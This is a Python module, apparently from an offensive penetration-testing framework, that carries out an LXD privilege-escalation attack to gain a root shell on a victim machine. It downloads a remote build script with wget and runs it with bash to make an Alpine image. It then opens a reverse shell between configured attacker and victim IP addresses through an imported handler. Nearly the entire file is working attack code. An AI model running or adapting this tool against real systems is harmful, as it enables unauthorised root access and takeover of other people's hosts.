import os, time, re
import sys
from Privilege_Escalation_LXD.rev_shell_handler import listen_shell
# This Exploit uses a vulnerability in the LXD software in order to spawn a root shell

class color:
	PURPLE = '\033[1;35;48m'
	CYAN = '\033[1;36;48m'
	BOLD = '\033[1;37;48m'
	BLUE = '\033[1;34;48m'
	GREEN = '\033[1;32;48m'
	YELLOW = '\033[1;33;48m'
	RED = '\033[1;31;48m'
	BLACK = '\033[1;30;48m'
	UNDERLINE = '\033[4;37;48m'
	END = '\033[1;37;0m'

def get_file_name():
	files = os.listdir(os.curdir)
	for file in files:
		# search given pattern in the line 
		match = re.search('alpine-.*\.tar\.gz$', file)
		# if match is found
		if match:
			return file
	return None

def run(victim_info, attacker_info, general_info, arguments, rep):

	a_ip = attacker_info['ip']
	a_port = attacker_info['port']
	v_ip = victim_info['ip']
	v_port = victim_info['port']
	
	# Dont print Banners if it's on repeat mode
	if arguments.repeat == None:
		print(color.CYAN + '''
		##################################################################################
		#										 #
		# 			    LXD PRIVILEGE ESCALATION 				 #		
		#										 #
		##################################################################################
		''' + color.END)
	
	print(color.GREEN + '[*]' + color.END + ' Getting Alpine Builder')
	if not ( os.path.exists('./build-alpine')):
		cmd = '''
		wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
		bash build-alpine
		'''
		p = os.popen(cmd).read()
		print(color.GREEN + '[+]' + color.END + ' Checking if alpine was built')
		if "Failed to install rootfs" in p:
			print(color.YELLOW + '[-]' + color.END + ' Problem building alpine, trying alternative, if this does not work, try to build alpine yourself with other flags')
			cmd='''
			chmod 777 build-alpine
			./build-alpine -a i686
			'''
			os.system(cmd)
		time.sleep(0.2)
		if not os.path.exists('./build-alpine'):
			sys.exit(color.RED + 'Something went wrong, build-alpine not detected' + color.END) 
	elif get_file_name() == None:
		print(color.GREEN + '[*]' + color.END + ' We detected that you already have an build-alpine file but not the alpine.tar.gz')
		cmd = '''bash build-alpine'''
		os.system(cmd)
	else:
		pass
	
	print(color.GREEN + '[*]' + color.END + ' Opening Reverse Shell on: {ip}:{port}'.format(ip=a_ip, port=a_port))
	listen_shell(a_ip, a_port, v_ip, v_port, general_info, arguments, victim_info['secure'] == 'True', rep)
	
